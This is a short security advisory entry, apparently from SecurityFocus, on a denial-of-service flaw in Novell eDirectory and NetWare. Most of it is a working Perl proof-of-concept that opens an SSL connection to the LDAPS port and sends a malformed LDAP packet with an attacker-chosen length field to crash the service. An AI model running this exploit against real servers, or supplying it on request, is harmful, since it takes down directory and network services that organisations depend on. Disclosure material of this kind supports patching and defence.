source: http://www.securityfocus.com/bid/47858/info

Novell eDirectory and Netware are prone to a denial-of-service vulnerability.

Remote attackers can exploit this issue to cause a system-wide denial-of-service. 

#!/usr/bin/perl
      # usage: ./novell.pl 10.0.0.1 0x41424344
      use IO::Socket::SSL;
      $socket = new IO::Socket::SSL(Proto=>"tcp",
      PeerAddr=>$ARGV[0], PeerPort=>636);
      die "unable to connect to $host:$port ($!)\n" unless $socket;
      print $socket "\x30\x84" . pack("N",hex($ARGV[1])) .
      "\x02\x01\x01\x60\x09\x02\x01\x03\x04\x02\x44\x4e\x80\x00" ;
      close $socket; print "done\n";


